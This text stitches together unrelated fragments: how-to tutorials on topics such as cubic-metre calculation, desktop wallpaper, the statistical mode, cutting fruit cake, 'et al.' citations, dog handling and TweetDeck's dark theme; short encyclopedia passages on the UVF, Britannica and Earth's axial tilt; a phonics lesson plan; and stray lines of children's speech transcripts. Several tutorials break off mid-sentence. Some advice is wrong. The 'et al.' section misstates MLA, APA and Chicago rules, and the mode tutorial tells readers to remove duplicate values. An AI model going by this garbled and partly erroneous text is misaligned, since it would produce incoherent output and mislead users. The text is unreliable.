Questions "Twinkle, twinkle little star " goes the classic children's song. Now that you are older and wiser you should know that stars don't twinkle and they certainly are not little! Actually, if you were to hollow out our Sun, which is a medium-sized star, you could fit more than 1 million Earth-sized planets inside! The stars have fascinated people throughout human history. Stop for a moment and gaze up at the night sky. You will only see a small portion of the billions upon billions of stars in our universe. The part of the sky you see is called your celestial sphere. Why don't you put one on dolly? You know the guy who was with me? Calculating Cubic Metres (CBM) Introduction: Cubic meters (CBM) is a unit measurement used to express volume or capacity. It is commonly used in various industries such as shipping, transportation, construction, and manufacturing. This tutorial will guide you through the process of calculating cubic meters with clear explanations, key tips, and guidelines for each step. By following these steps, you'll be able to calculate CBM accurately and confidently. Step 1: Understanding Length, Width, and Height To calculate CBM, you need to know three measurements - length, width, and height. These dimensions are usually expressed in meters, but they can also be measured in centimeters, millimeters, inches, feet, or yards. To convert any non-meter units into meters, consult an online conversion tool or refer to standard conversion factors. For this example, let's assume all your measurements are already given in meters. Key tip: Always ensure that your measurements are accurate and consistent; using mixed units may lead to errors. Step 2: Measure the Object's Dimensions Using a measuring tape, ruler, or other appropriate tools, measure the length, width, and height of the object whose volume you wish to determine. Record these values carefully. Let L represent the length, W represent the width, and H represent the height. Guideline: When taking measurements, make sure to maintain proper alignment along one plane while recording the value. Avoid estimating or rounding off numbers during this stage. Step 3: Multiplying the Three Values Together Once you have recorded the necessary measurements, multiply them together to find their product. The formula for calculating volume (V) when you know the length, width, and height is V = L x W x H. Using our notation from Step 2, input your specific values into this equation. Key tip: Perform calculations using a calculator if needed, especially when dealing with large volumes or decimal points. Remember to double-check your work at every step to avoid mistakes. Step 4: Confirm Units Used Ensure that the resulting volume is expressed in cubic meters (CBM). If you initially took measurements in different units like centimeters or inches, convert those values back to meters before performing the multiplication in Step 3. Guideline: Consistency in units used throughout the calculation process ensures accuracy and eases understanding. Step 5: Review Your Work Review all the steps taken so far - ensuring correctness of your measurements, conversions, and mathematical operations. Make sure everything adds up correctly and matches the real-world scenario you're working with. Key tip: Cross-verify your calculated result against known benchmarks or reference materials whenever possible, which could help identify potential discrepancies early on. Conclusion: By diligently following these five steps, you should now have successfully determined the volume of an object in cubic meters (CBM). Accurate CBM calculations play crucial roles in several fields, including logistics, production planning, inventory management, engineering design, among others. Practice makes perfect, keep honing your skills, and soon enough, calculating CBM will become second nature! And put the muffins back in the container. It's kind of boring said baby bear. The Ulster Volunteer Force (UVF) is a loyalist paramilitary (civilians trained as soldiers) group based in Northern Ireland. It was formed in 1966. It takes its name from the UVF of World War I. The Ulster Volunteer Force was started as a Protestant/Unionist militia (citizen military force) in 1912 to oppose the Home Rule campaign for a separate Irish parliament. Many UVF members formed the 36th (Ulster) Division that fought with the British Army in World War I. The Progressive Unionist Party is the political wing of the outlawed Ulster Volunteer Force and Red Hand Commando. Although the PUP is called a loyalist fringe party, it has more moderate unionist views than any of the traditional unionist parties. Once upon a time, there was a little girl named Lucy. In the second era (7th-9th editions, 1827-1901), the "Britannica" was owned by the Edinburgh company, A & C Black. Although some of the people who helped write the "Britannica" helped because they were friends of the most important editors, many other people wanted to help the "Britannica" because it was becoming very successful. These people came from many other countries, and some of them were very famous for the things they wrote about. An index of all the articles was written to add to the 7th edition of the encyclopaedia, and they continued to make an index until 1974. The first English chief editor was Thomas Spencer Baynes, who led the making of the famous 9th edition, which is also called the "Scholar's Edition". The 9th edition is considered to be the "Britannica" most meant for students ever written. However, at the end of the 19th century, the 9th edition was already too old and the "Britannica" had many financial problems. Title: How to Choose a Desktop Wallpaper Introduction: A desktop wallpaper is an image or design that appears as the background on your computer's screen. It can be a simple solid color, a photograph, abstract art, pattern, or even an animated clip. The right choice of wallpaper can significantly enhance your computing experience by reflecting your personality, mood, interests, and values. This tutorial will guide you through selecting and applying a new desktop wallpaper with careful consideration and creativity. Step 1: Identify Your Purpose Determine why you want to change your current wallpaper. Is it because you are bored with what you have now? Or do you want something more inspiring, calming, or motivating? Understanding your purpose will help narrow down your options and make the selection process easier. Key Tip: Consider using multiple wallpapers based on different purposes (e.g., one for work mode, another for leisure time). Step 2: Measure Your Screen Resolution The ideal wallpaper size matches your screen resolution to ensure optimal quality and fit without distortion. To find out yours, go to Settings > Display > Advanced display settings (Windows) or System Preferences > Displays > Display tab (Mac), then look under 'Resolution'. Make note of this value before proceeding. Guideline: Common resolutions include Full HD (1920x1080 pixels), Quad HD (2560x144 Thank you 'cause sugar's not good for your teeth. These include the 'behavior' CSS property, which connects the HTML elements with JScript behaviors (known as HTML Components, HTC); HTML+TIME profile, which adds timing and media synchronization support to HTML documents (similar to the W3C XHTML+SMIL); and the VML vector graphics file format. However, all were rejected, at least in their original forms. VML was, however, subsequently combined with PGML (proposed by Adobe and Sun), resulting in the W3C-approved SVG format, currently one of the few vector image formats being used on the web, and which IE is now virtually unique in not supporting. Title: How to Be Happy in Life Happiness is subjective and can mean different things to different people. However, there are several universal steps that you can take to increase your overall sense of happiness and well-being. This comprehensive guide will provide you with in-depth explanations, key tips, and guidelines to help you become happier in life. ### Step 1: Cultivate Gratitude Explanation: Gratitude is the act of expressing appreciation for what you have in your life. Practicing gratitude has been scientifically proven to improve mental health, reduce stress, and enhance feelings of optimism and joy. Key Tips and Guidelines: * Keep a daily gratitude journal, where you write down three things you're grateful for each day. * Share your gratitude with others by telling them why you appreciate them or sending thank-you notes. * Practice mindfulness meditation focused on gratitude - focus on being present and thinking about the positive aspects of your life. By: Jessica Pieplow For children to read and spell words, it is imperative that they understand that letters stand for phonemes. Also, spellings map out the phonemes that are found in spoken words. By practicing correspondences, which is composed of a grapheme and a phoneme, a child will come to have a better understanding letters, phonemes, and the mappings of phonemes in spoken words. In this lesson, the students will learn the correspondence, oa = /O/. They will be able to recognize the /O/ sound in spoken and written words in connection with the letter representation of oa. Elkonin letterboxes and letterbox letters (oa, t, l, d, c, s, p) for each child, dry erase board and markers, Bo and Rose books for each student, primary paper and pencil for each student, pre-made worksheet with sentences that contain the oa= /O/ correspondence, another worksheet with pictures and corresponding words 1. Begin by learning the oa= /O/ correspondence to review the long O sound. Have students think of words that make the long O sound. Write the words that are given on a small dry erase board. Some of these words may be the written with oa, but some may not. 2. Discuss the /O/ sound and explain that there is more than one way to represent this sound. Look on the board and select the words that represent the /O/ sound with the letters, oa. (If there is not one up there, show the students some words with the selected correspondence. Circle the oa correspondence in all of the words on the board. 3. Now is the time to introduce the tongue twister for the correspondence. Write this sentence on the board so that the students can see the words. Then, read the sentence to the students. "This is our tongue twister for the long /O/ sound. Load the boat to travel the moat. Now we are going to go through and underline our long /O/ sound. Load(underline) the boat(underline) to travel the moat(underline). Now, let's all say this tongue twister together. Clap your hands one time when you hear the long /O/ sound." Make sure that the students clap each time it is appropriate in the sentence. Do this twice. 4. "Great job! This time let's drag out our long /O/ sound in our tongue twister. "Loooooaaaaaaad the booooooaaaaat to travel the mooooooaaaaaat." 5. Now, it is time for the letterbox lesson. Review the rules with the class first. For example, "If there is one sound but two letters, how many boxes need to be used? One" After reviewing the rules, go over a few examples with the students, explaining what you are doing and why. To do this, draw letterboxes on your dry erase board so that the students can see and model examples. For example, "Okay class, I have drawn 3 letterboxes. I am trying to spell the word boat. Okay, so let me break it up. b- O - t. b- O- t. Okay. In my first box, I need the b sound, so I'm going to be a b in the first box. For the second box, I need the O sound. I can spell that with an oa. SO, if going to be oa in the second box for my O sound. T is my last sound. For the last box, I'm going to put a t. So let me but it all together. Boat. Great! That's boat. Now, you guys try a few. First, let's get out our letters oa, t, l, d, c, s, p. Our first word is soap (3 letterboxes). The next word is boat (3 letterboxes). The next word is coat (3 letterboxes). The last word is load (3 letterboxes). Great job class! Now let's go back, and I'll spell the words and you guys will read the words." 6. "Now, we are going to read, Bo and Rose. When you come across a word with the correspondence that we've learned today, I want you to write it down on your own sheet of paper. When everyone is through reading, we can go through and see if we found all of the words." 7. To assess my students, I will create a worksheet that focuses on the new correspondence. The students will be directed to read through the sentences, circling the words that represent our oa= /O/ correspondence. Also, there will be another sheet with pictures and decodable words. The students will match the correct word with the correct picture. York, Lindsay. (2003) Meet Lee, the Sleepy Bee. A beginning reading design created by Lindsay York. Aerial silks, also known as tissu, are a type of circus art that involves performing acrobatic moves while suspended in the air using long fabric sheets. This tutorial will guide you through the basics of getting started with aerial silks, including safety measures, foundational skills, climbing techniques, and simple tricks. **Safety Measures:** 1. **Choose a reputable studio or instructor.** Make sure they have proper insurance, certification, and experience in teaching aerial silk classes. 2. **Warm-up properly before every session.** Focus on stretching your shoulders, back, hips, and legs to prevent injuries. 3. **Always wear appropriate clothing.** Opt for form-fitting attire made from breathable materials like cotton or polyester; avoid loose clothes as they may get caught in the fabric. 4. **Check your equipment.** Inspect the aerial silk for fraying, tears, or other signs of damage before each use. Notify your instructor immediately if you notice anything unusual. 5. **Learn how to fall safely.** Familiarize yourself with safe falling techniques, such as rolling out of a fall or landing on your feet with bent knees. 6. **Never attempt advanced moves without proper instruction.** Progress gradually, mastering basic skills before moving onto more complex ones. 7. **Communicate openly with your instructor.** Share any concerns or questions you have, and let them know if you feel discomfort during exercises. **Foundational Skills:** *Footlocks & Climbing Techniques:* = = = children/CHIDES_NA/Gilliam/TD/11f/47030wy.cha = = = Do you know how to spell his last name? The "opposite" of "public domain" is copyrighted material, which is owned either by the creator of the work or their estate. The term "public domain" is only used to describe things that can be copyrighted, such as photographs, drawings, written articles, books or plays, or similar works of art. As a general rule, all intellectual property works, after enough time has gone by, will become part of public domain. Examples include the works of Leonardo da Vinci, William Shakespeare and Ludwig van Beethoven, and the books of Isaac Newton. Can you feed the baby some peas? Calculating the mode is an essential skill in statistics that can help you find the most frequently occurring value in a data set. This tutorial will guide you through calculating the mode in a clear and detailed manner, with in-depth explanations for each step. By following these instructions, you'll be able to determine the mode of any given data set accurately and confidently. ### Part 1: Preparing your Data Set Before starting the calculation process, ensure that your data set is organized, well-structured, and free from errors or inconsistencies. Organize your data into a single column if necessary, as this format makes it easier to identify the mode later on. Key Tips & Guidelines: * Make sure all values are numerical and consistent (e.g., no spelling mistakes). * Remove duplicate entries unless they represent different instances of measurement. * Sort the data set before proceeding, which simplifies finding the mode(s) in larger data sets. Example: Suppose we have the following unsorted data set representing test scores: {85, 90, 76, 92, 83, 90, 76, 88}. After sorting, our data set becomes: {76, 76, 83, 85, 88, 90, 90, 92}. ### Part 2: Identifying Categories of Values Divide the sorted data set into categories based on their unique values. For example, group all occurrences of '76', then move onto the next number ('83'), followed by '85', etc. It may also be helpful to create a table or list displaying each category along with its frequency count. Key Tips & Guidelines: * Keep track of individual frequencies within each category; this information is crucial when determining the mode. * Remember that some data sets might contain more than one mode due to multiple categories having identical highest frequencies. Using the previous example, let's organize the data into categories: | Category | Value | Frequency | | --- | --- | --- | | A | 76 | 2 | | B | 83 | 1 | | C | 85 | 1 | | D | 88 | 1 | | E | 90 | 2 | | F | 92 | 1 | ### Part 3: Determining the Mode Now, analyze the table created earlier to locate the category (or categories) with the maximum frequency count - this indicates the mode(s) of the dataset. If there is only one such category, congratulations! You have successfully identified the mode. However, if two or more categories share the same maximum frequency, then the dataset contains multiple modes, making it multimodal. Key Tips & Guidelines: * Always double-check calculations and comparisons between categories during this stage. * Be prepared to deal with multimodal datasets since they often require further investigation or interpretation. In our example, both categories A and E share the maximum frequency of 2. Therefore, the dataset has two modes: 76 and 90. Congratulations! You now know how to calculate the mode using a well-organized, error-free dataset. With practice, identifying the mode will become second nature, helping you quickly extract valuable insights from various statistical applications. You look so strong, balancing that stick across your body." Max smiled, feeling proud of his skills. He wanted to show her more, so he began to balance on one foot. Max nodded, determined to get better. He kept practicing, and slowly his balance improved. Soon, his mom said it was time to go back home. "Good job, Max. A recent project discovered nearly 1500 new RNA viruses by sampling over 200 invertebrate species. "The research team... extracted their RNA and, using next-generation sequencing, deciphered the sequence of a staggering 6 trillion letters present in the invertebrate RNA libraries". The research showed that viruses changed bits and pieces of their RNA by a variety of genetic mechanisms. "The invertebrate virome [shows] remarkable genomic flexibility that includes frequent recombination, lateral gene transfer among viruses and hosts, gene gain and loss, and complex genomic rearrangements". Title: How to Cut Fruit Cake Like a Pro Introduction: Fruit cake is a classic dessert enjoyed during holiday seasons or special occasions. However, cutting fruit cake can be challenging due to its dense texture and abundance of fruits and nuts. This tutorial will guide you through the process of cutting fruit cake with precision and ease, ensuring that every slice is perfect for serving. Materials Needing: * A well-baked fruit cake * A sharp serrated knife (8-10 inches long) * A clean cutting board * Optional: a warm towel Step 1: Prepare Your Equipment Before starting, make sure your knife is sharp as this will ensure smooth cuts without crushing the delicate ingredients inside the cake. Rinse the knife under hot water before wiping it dry; doing so will help melt any residue from previous uses which could hinder proper slicing. Step 2: Choose the Right Angle Place the fruitcake upside down onto the cutting board if the bottom has been sealed with marzipan or fondant - these coatings are typically harder than the top part of the cake. Position the cake centrally on the board, making sure there's enough space around it for easy maneuverability while cutting. Step 3: Score Initial Lines Using gentle sawing motions, score the surface of the cake lightly along the length where you plan to cut. Apply minimal pressure here; just enough to leave an indentation as guidance for later. Repeat this scoring across the width of the cake too, creating square divisions. These lines serve as visual cues when making full cuts, helping maintain uniform portion sizes. Key Tip: If the cake seems unstable, wrap a piece of dampened paper towel around the base to secure it to the board. Step 4: Begin Full Cuts With one hand stabilizing the handle and another guiding the blade, start at either end of the scored line and begin sawing back and forth slowly but firmly. Let the weight of the knife do most of the work. Continue until you feel resistance decrease significantly, indicating successful completion of the first slice. Step 5: Complete Slices Across the Width Now move on to complete cuts perpendicularly to your initial longitudinal slice. Remember to keep using light scores as guides, maintaining evenness throughout. It might take several attempts to get used to this rhythm, especially considering the varying densities within the cake itself. Step 6: Clean Knife Between Each Slice After each slice, wipe off excess crumbs from the knife. Running the blade under hot water again may also prove beneficial, preventing sticking by removing sticky residues. Dry thoroughly afterwards to avoid rust formation. Step 7: Serve Perfectly Portioned Slices Once all slices have been made, lift them gently onto individual plates. For best results, allow guests to add their preferred sauces or garnishes themselves. Additional Tips: * Using a warmed knife makes glazes runnier and allows smoother cuts. To heat the knife, dip it into a cup filled with hot water, then quickly dry it off before proceeding. * When storing leftover pieces, place parchment paper between layers to prevent sticking together. * Always remember that patience yields better results in tasks like these. Don't rush; instead focus on getting steady, consistent cuts. Conclusion: By following these steps meticulously, you should now be able to present beautifully cut slices of fruit cake fit for any gathering. With practice, what once seemed daunting becomes second nature. Enjoy! Title: How to Enable Data Roaming on a Samsung Galaxy Device Data roaming is a feature that allows your Samsung Galaxy device to access the internet or send text messages using a cellular network when you are outside of your carrier's standard coverage area. This can be particularly useful if you travel frequently or find yourself in areas with limited Wi-Fi connectivity. Here's our comprehensive guide on enabling data roaming on your Samsung Galaxy device. **Step 1:** Accessing Settings Start by opening the 'Settings' app on your Samsung Galaxy device. You can do this either by finding the icon on one of your home screens or apps trays, or by swiping down from the top of the screen to reveal the notification panel, then tapping on the settings gear icon located usually at the upper right corner. **Step 2:** Select Mobile Networks Once in the Settings menu, scroll down until you see 'Connections.' Tap on it, then select 'Mobile Networks,' which should be near the top of the list. **Step 3:** Enabling Data Roaming Under the Mobile Networks section, tap on 'Data Roaming.' By default, this option may be off depending upon your service provider settings. To enable it, slide the switch to the right so it turns blue. A popup message will appear asking if you want to turn on data roaming; confirm this action by selecting 'OK.' Enabling data roaming means your phone can now utilize other carriers' networks while traveling abroad or visiting regions where your regular carrier has weak signals. However, please note that additional charges often apply when using data roaming services. Always check with your mobile carrier regarding their specific international plans before activating data roaming to avoid unexpected fees. **Key Tips & Guidelines:** * Remember to disable data roaming once you return home or finish traveling to prevent any unnecessary costs. * Consider purchasing an international plan from your carrier prior to your trip. These plans typically offer discounted rates compared to pay-per-use charges. * Use Wi-Fi whenever possible instead of relying solely on cellular data to minimize potential roaming expenses. * Monitor your data usage regularly during your travels. Most devices allow you to view real-time data consumption stats within the settings menu. * Be aware of what activities consume large amounts of data (streaming videos, downloading files) and limit these as necessary. * Some applications continue running in the background even when minimized or closed. Check app permissions and adjust accordingly to reduce unwanted data usage. By following these steps carefully and keeping these guidelines in mind, you'll ensure seamless connectivity without excessive charges! Chi call your grandmother tell her to come and get you. Other Things Your Toddler May Do - Use and understand direction and position words, such as "around," "backwards," "forward," "inside," and "underneath." - Comment on pictures in books. - Show an understanding of story plots and act them out using puppets or dolls. - Answer complex questions, such as "What is this?" or "How did you do that?" - Respond to requests: "Go find your coat, please," or "Please get a paper towel." Title: How to Hold a Butterfly Butterflies are delicate and beautiful creatures that can be fascinating to observe up close. However, handling them carefully is essential to prevent injury or stress. This article will provide you with a detailed guide on how to hold a butterfly correctly, ensuring its well-being while still enjoying this intimate experience. **Things You'll Need:** * A calm, gentle demeanor * Patience * Clear view of the butterfly * Small container (optional) **Step 1: Approach Slowly and Calmly** Approaching a butterfly too quickly may scare it away or cause unnecessary stress. Instead, move slowly and calmly towards your chosen subject. Avoid making any sudden movements or loud noises as these could startle the butterfly. Keeping a relaxed posture also signals to the butterfly that you mean no harm. **Step 2: Observe from a Distance First** Before attempting to handle the butterfly, spend some time observing it from a distance. Not only does this allow the butterfly to become accustomed to your presence, but it also gives you an opportunity to identify which species you're dealing with and where it might be most accessible for careful interaction. **Step 3: Use a Container (Optional)** If possible, consider using a small, clear container like a pillbox or insect observation box to contain the butterfly during handling. This method minimizes direct contact between your hands and the butterfly, reducing potential damage or stress. Make sure there are ventilation holes in the container to ensure proper airflow. **Step 4: Position Your Hand Correctly** When ready to pick up the butterfly, position one hand palm-up beneath the butterfly. The idea here is to mimic the appearance of a leaf so that the butterfly feels safe landing on your hand. Curling your fingers slightly can help create this effect. **Step 5: Encourage Landing** To encourage the butterfly to land on your hand, gently blow on it or wave a finger near it. Be cautious not to touch the butterfly directly; instead, try to persuade it onto your waiting hand by imitating natural elements such as wind gusts or moving leaves. **Step 6: Cup Your Other Hand Around the Butterfly** Once the butterfly has landed on your open hand, cup your other hand over it gently. Try to avoid touching the wings if at all feasible. If necessary, use the edge of your fingertips to ever-so-slightly nudge the butterfly's legs into a position where they hook around your finger(s). **Key Tips and Guidelines:** * Always wash your hands beforehand to remove any strong smells that could disturb the butterfly. * Never grab a butterfly by its wings, body, or antennae. These areas are sensitive and prone to damage. * Limit handling time to less than a minute to minimize stress and potential harm. * Release the butterfly back into its environment once you've finished observing it. * Remember that different butterfly species have varying temperaments and tolerances for human interaction. Some may be more skittish than others, so respect their boundaries and always prioritize their welfare. It's okay you can have three cupcakes. Title: How to Cite With "Et Al." - A Comprehensive Guide Introduction: When writing academic papers or articles, you often need to cite multiple sources within your text. When a work has three or more authors, it is common practice to abbreviate the list of author names using "et al." This guide will walk you through the process of properly incorporating "et al." into your citations while adhering to various popular citation styles such as MLA, APA, Chicago, and others. Step 1: Identify works with Three or More Authors Determine if the source you are citing has been written or published by three or more individuals. You can usually find this information on the title page or cover of the book, or at the beginning of an article. If there are indeed three or more authors, proceed to Step 2. Key Tips & Guidelines: * Pay close attention to spelling and formatting when identifying author names; consistency is crucial throughout your paper. * Some electronic databases may automatically condense the list of authors when generating a citation, so double-check before copying over the information. Step 2: Understand the Meaning and Purpose of "Et Al." "Et al." is short for the Latin phrase "et alia," which means "and others." By using "et al.", you acknowledge that there are additional contributors involved in creating the cited work without listing them all out every time. It saves space and improves readability. However, it does not mean "and friends" or imply any casual relationship between the named author(s) and other unnamed contributors. Step 3: Learn the Specific Rules for Each Citation Style Different citation styles have slightly varying rules regarding the usage of "et al." Here's what you should keep in mind for some commonly used ones: A. MLA (Modern Language Association): In MLA format, 'et al.' is typically only employed in the Works Cited page rather than directly within the body paragraphs. For example, instead of saying "(Smith et al., 56)," write the full list of authors up until the third one followed by ": 56" in parentheses. On the Works Cited page, however, truncate the list after the first author followed by 'et al.', separating their names with commas. B. APA (American Psychological Association): APA encourages the use of 'et al.' both within the text and reference entries once a work has four or more authors. Within the main text, include the surname of the first author followed by 'et al.' in parenthesis immediately after the quote or paraphrase. Similarly, in the References section, list the first six authors followed by ellipsis (...) then add the last author's name. C. Chicago Manual of Style (Turabian Variant): Chicago style recommends including all author names in footnotes but permits the use of 'et al.' in bibliographies once a work includes seven or more authors. List the first author's surname followed by 'et al.' and end with a period. Remember these are just general guidelines; specific exceptions might apply depending on individual professors' preferences or publication requirements, so always confirm before submitting! By following this tutorial carefully, you now possess the necessary knowledge to effectively utilize 'et al.' in your academic writings across different citation formats. Properly acknowledging sources demonstrates respect towards original creators and strengthens your credibility as a scholar. Happy researching! On the XXX and then I height sing it. In many of these physics problems time is a variable. Time uses the letter "t". Using the basic ideas in algebra can help reduce a math problem to its simplest form making it easier to solve difficult problems. Energy is "e", force is "f", mass is "m", acceleration is "a" and speed of light is sometimes "c". This is used in some famous equations, like f = ma and e=mc^2 (although more complex math beyond algebra was needed to come up with that last equation). We call an imaginary line running through the Earth from pole to pole, that Earth's axis. We say that the Earth spins on its axis, one spin being 1 day. But the Earth's axis is not perpendicular to the plane of the solar system. Instead, it is tilted 23.5 degrees. It is this tilt that provides us with seasonal changes. The best way to understand it is to understand the effects as we see them from Earth. Observers in North America notice that the Sun is higher in the sky in summer than in winter. These changes in position result from an apparent motion of the Sun north and south of the celestial equator (a projection of the Earth's equator into space.) This apparent motion is the result of that 23.5 degree axial tilt. On the Autumn and Spring Equinoxes the Sun crosses the celestial equator. One these days there is an equal amount of day and night. The Sun rises due east and sets due west. As the summer solstice approaches on June 21st, the days get longer and the Sun rises higher in the sky at noon. It is also rising and setting further north of east and west. At this time, the northern hemisphere is pointing toward the Sun. As the winter solstice approaches on December 21st, the days are shorter and the Sun is lower in the sky at noon. The sun is also rising and setting south of east and west. During this time, the Earth is pointed away from the Sun. Copyright 1997 Kathy A. Miles and Charles F. Peters II He might have meant that my fault I doubt it though. [points to a picture in the book] Critical Thinking & Information Literacy Across the Curriculum Web Search Engines Searching for information on the World Wide Web (WWW) is not very precise. There is no system like Library of Congress subject headings to help you, and search engines locate sites by a variety of methods. The number of hits you receive for a search can be tens or hundreds of thousands - way too many to sift through. Every search engine uses a different technique to find web sites, and even the best search engines look at 30% or less of the sites on the WWW. This means that you need to be creative in your search strategy and you should use two or more search engines. Your aim really is to find a reliable site with a lot of links so you can continue your research from there. In this exercise we are going to look at results from different search engines and compare them to each other. Your instructor will assign a topic or have you use a topic you choose. The first thing you need to do is write out a list of word and phrases that will help you find the information you want. These are called search terms. - Write down a list of search terms relevant to your topic. Think of as many words and phrases as you can - you may need to use more than one search term. - First, try using several of these search terms in Yahoo. Yahoo is a topic index, not a search engine. This means that real people have looked at these sites, picked the best ones, and sorted them into categories. Yahoo is a good starting place if you are not sure of your topic. List the search terms that got the best results and the number of hits (pages found) Now try 3 different search engines using the term that was most successful in Yahoo. You may click on Netsearch and choose a search engine or type in the URL. The URLs for several search engines are listed below. AltaVista - http://altavista.digital.com HotBot - http://www.hotbot.com Excite - http://www.excite.com WebCrawler - http://www.webcrawler.com Lycos - http://www.lycos.com - Complete the following table. For # relevant hits, look at the first 10 sites listed, and see which ones could be used for a research paper or project on this topic. You will find that some sites have little or nothing to do with your topic. Search Engine total # hits # relevant hits - Of the first 10 sites, how did the results compare? Were all the sites the same for each search engine? If they were different, how much difference was there? - Find a good page on the topic with lots of links? A link is a direct connection to another web page, it is usually in blue and often underlined. You click on the link and go directly to that site. What is the URL? (You may print this page if you wish). Why is a page with good links useful? - Which search engine seemed to be the best for this particular search? Explain your answer. - Try some of other search terms you listed in question #1. Are the results different? If so, how? - Search EbscoHost using the same search term you used in question #3. You may access EbscoHost through the BCC Library Home Page. The URL is http://ir.bcc.ctc.edu/library. Click on Resources and Catalogs, then EbscoHost. How many hits? Regular stretching exercises can help alleviate symptoms by improving flexibility, reducing swelling, and enhancing blood flow in the affected area. This wiki-style guide will provide you with an in-depth understanding of various hand stretches suitable for carpal tunnel relief, along with their benefits and proper techniques. **Step 1: Prayer Stretch** 1. Title: Build Intimacy by Talking Less: A Comprehensive Guide Introduction: When building intimacy with someone, many people believe that talking more is the answer. However, sometimes saying less can create a deeper connection. This guide will help you understand the concept of building intimacy through speaking less and provide actionable steps to implement this strategy into your relationships. Step 1: Understand Active Listening Key Tip: Focus on understanding your partner instead of focusing on what you want to say next. Active listening involves giving undivided attention to the speaker, providing verbal and non-verbal feedback, and refraining from interrupting or formulating responses while they speak. By actively listening, you demonstrate respect, empathy, and genuine interest in your partner's thoughts and feelings, which strengthens emotional bonds between both parties. Step 2: Practice Silent Support Key Guideline: Allow pauses during conversations without feeling compelled to fill them immediately. Silence does not always signify discomfort or awkwardness; it can also represent thoughtfulness and contemplation. Instead of rushing to talk when there's a lull in conversation, embrace these moments as opportunities for reflection and self-awareness. Your partner may appreciate having space to gather their thoughts before continuing the discussion. Step 3: Pose Open-Ended Questions Key Tip: Encourage deep thinking and sharing through open-ended questions rather than closed ones. Title: How to Get Your Dog Ready to Be Handled Introduction: Proper handling of your dog is essential for various reasons such as grooming, veterinary examinations, and obedience training. It also strengthens the bond between you and your pet. This tutorial will guide you through the process of getting your dog accustomed to being handled in a gentle and positive manner. Remember that patience and consistency are crucial in this process. Step 1: Choose the Right Time and Place Find a quiet place with minimal distractions where both you and your dog can feel comfortable and relaxed. Make sure neither of you is hungry or tired as these factors could affect your dog's behavior negatively. Step 2: Approach Your Dog Correctly Approaching your dog the right way sets the tone for the entire session. Stand sideways rather than facing them directly, which may seem confrontational. Bend down slowly so you don't appear threatening, extend your hand palm up towards their nose, letting them sniff you first before gently patting them. Step 3: Start With Touching Their Ears Dogs often dislike having their ears touched due to its sensitivity. Begin by softly rubbing behind their ears, then gradually move towards the base of the ear. Praise them verbally using a calm, happy voice throughout this process. If they pull away or show signs of discomfort, stop immediately and try again later. Step 4: Proceed to Touching Other Areas After your dog gets used to having their ears touched, start working on other areas like their paws, tail, mouth, and belly. Always go slow and be patient. Reward good behavior with treats or praise to reinforce positivity. Key Tip: Many dogs do not enjoy having their paws handled. To get your dog more comfortable with this, touch each pad individually while giving plenty of verbal praise. You can also incorporate short play sessions with toys that require them to 'give paw', making it a fun activity instead of a stressful one. Step 5: Gradually Increase Duration and Frequency Once your dog becomes comfortable with being touched in different places, increase the duration and frequency of these handling sessions. However, always ensure they remain enjoyable and never force anything that makes your dog uncomfortable. Step 6: Introduce Nail Trimming Start by holding your dog's paw and pressing gently on the pads to expose the nails. Don't cut yet; just let them get used to the sensation. Use nail clippers designed specifically for dogs. Once they're calm about having their paws held, introduce the sound of the clippers nearby, then eventually progress to clipping a small portion of the nail. Always reward calmness during this process. Step 7: Practice Regular Grooming Sessions Brushing, bathing, dental care - all these activities involve handling. Familiarize your dog with these routines early on so they associate them with pleasant experiences. Guideline: Never punish your dog during these sessions. Instead, focus on creating a positive association with being handled. Use treats, praise, and love to make every interaction a pleasurable experience for both of you. Conclusion: Remember, getting your dog ready to be handled requires time and effort but the results are worth it. Patience, consistency, and understanding your dog's body language are vital in this journey. By following this tutorial, you'll help your furry friend become confident and cooperative when being handled, ensuring easier vet visits, grooming appointments, and overall better companionship. Title: How to Activate Dark Theme on TweetDeck Introduction: TweetDeck is a popular social media dashboard used by many Twitter power users to manage multiple accounts, monitor lists, and keep up with hashtags and trends. Enabling the dark theme can help reduce eye strain during late-night tweeting sessions or when using your device in low light conditions. This tutorial will guide you through the process of activating the dark theme on TweetDeck, providing detailed steps and helpful tips along the way. Step 1: Log into TweetDeck Visit <https://tweetdeck.twitter.com/> and enter your Twitter username and password to sign in. It's essential to start from the main TweetDeck interface because some settings are different from those found within the standard Twitter website. Key tip: If you have already signed in to Twitter on another tab or browser window, clicking the 'Log in with Twitter' button should automatically log you into TweetDeck without requiring additional credentials. Step 2: Access Settings Locate the profile picture at the top right corner of the screen and click on it to reveal the dropdown menu. From there, select 'Settings'. The gear icon next to the profile picture also serves as an alternative shortcut to accessing the Settings page directly. Guideline: Remember that changes made in this section affect your overall TweetDeck experience rather than individual columns or accounts, making it easier to maintain consistent preferences across all your managed profiles. Step 3: Select General Preferences Upon opening the Settings panel, ensure you're on the 'General' tab located near the bottom left side of the popup window. Here, you'll find various options related to customizing your TweetDeck workspace. Step 4: Enable Dark Mode Scroll down until you see the 'Theme' option under the Display heading. Click on the associated dropdown list, then choose either 'Dark' or 'Dimmed.' Both themes provide a dark background but differ slightly in their color schemes; pick whichever suits your preference best. Explanation: Choosing the 'Dark' mode sets a solid black background contrasted by white text, while the 'Dimmed' mode offers a more subtle grayish backdrop complemented by lighter shades of grey for text elements. Either choice significantly reduces glare compared to the default bright layout. Step 5: Save Changes After selecting your preferred dark theme, make sure to save any modifications before navigating away from the Settings panel. To do so, simply click the blue 'Save Changes' button situated towards the bottom right corner of the popup window. A loading spinner will appear briefly, followed by a success message confirming the update. Important note: Failing to save changes results in losing unsaved progress once you close the Settings panel. Always remember to hit the 'Save Changes' button after configuring new settings. Step 6: Verify Application Now that you've successfully activated the dark theme on TweetDeck, take a moment to appreciate your newly transformed interface! All primary areas, including navigation menus, column headers, and tweet content, should now display against a darker backdrop. Conclusion: Congratulations! By following these six easy steps, you've effectively enabled the sleek and comfortable dark theme on TweetDeck. Enjoy managing your Twitter presence with reduced eye strain and improved visual appeal. As always, feel free to revisit the Settings panel whenever you wish to explore further customization possibilities tailored to enhance your TweetDeck usage. Okay which... this one goes in back. Deleting titles from the wikiHow suggested title database is a task that only community members with certain permissions can do. If you have those permissions, this tutorial will guide you through the process of deleting unnecessary or irrelevant titles from the database. **Step 1: Log in to your wikiHow account.** To start, log in to your wikiHow account using your username and password. This will give you access to the tools necessary to delete titles. **Step 2: Go to the Special:SuggestTitle page.** Once logged in, navigate to the Special:SuggestTitle page. This page contains all of the suggested titles generated by the wikiHow system. **Step 3: Review the list of suggested titles.** Take some time to review the list of suggested titles. Look for any titles that are duplicates, spam, offensive, or otherwise not suitable for inclusion in the wikiHow database. Key tips for this step 